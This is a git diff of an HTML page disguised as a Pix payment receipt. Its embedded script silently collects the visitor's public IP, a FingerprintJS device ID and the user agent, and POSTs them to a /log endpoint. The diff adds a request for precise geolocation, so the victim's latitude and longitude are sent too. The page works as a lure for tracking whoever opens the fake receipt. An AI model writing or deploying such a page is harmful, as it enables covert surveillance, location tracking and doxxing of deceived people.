@@ -11,49 +11,54 @@
 <body>
   <img src="comprovante.jpg" alt="Comprovante Pix">
 
-  <script
-  async
-  src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"
-></script>
+  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 
-<script>
-  console.log("🟡 Script carregado... preparando rastreamento");
+  <script>
+    console.log("🟡 Script carregado... preparando rastreamento");
 
-  fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(ipData => {
-      console.log("🌍 IP detectado:", ipData);
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
-      FingerprintJS.load()
-        .then(fp => fp.get())
-        .then(result => {
-          const visitorId = result.visitorId;
-          const device = navigator.userAgent;
+        console.log("📍 Geolocalização precisa:", lat, lon);
 
-          console.log("🧠 Fingerprint:", visitorId);
+        fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .then(ipData => {
+            FingerprintJS.load()
+              .then(fp => fp.get())
+              .then(result => {
+                const visitorId = result.visitorId;
+                const device = navigator.userAgent;
 
-          fetch("/log", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              ip: ipData.ip,
-              visitorId,
-              userAgent: device,
-              device
-            })
-          })
-            .then(r => {
-              if (r.ok) {
-                console.log("✅ Dados enviados com sucesso");
-              } else {
-                console.warn("⚠️ Problema ao enviar dados:", r.status);
-              }
-            })
-            .catch(err => console.error("❌ Falha no envio:", err));
-        })
-        .catch(err => console.error("❌ FingerprintJS falhou:", err));
-    })
-    .catch(err => console.error("❌ Falha ao obter IP:", err));
-</script>
-
+                fetch("/log", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    ip: ipData.ip,
+                    visitorId,
+                    userAgent: device,
+                    device,
+                    loc: `${lat},${lon}`
+                  })
+                })
+                  .then(r => {
+                    if (r.ok) {
+                      console.log("✅ Dados enviados com sucesso");
+                    } else {
+                      console.warn("⚠️ Problema ao enviar dados:", r.status);
+                    }
+                  })
+                  .catch(err => console.error("❌ Falha no envio:", err));
+              });
+          });
+      }, err => {
+        console.warn("⚠️ Geolocalização negada ou falhou:", err);
+      });
+    } else {
+      console.log("❌ Geolocalização não suportada no navegador.");
+    }
+  </script>
+</body>
 </html>
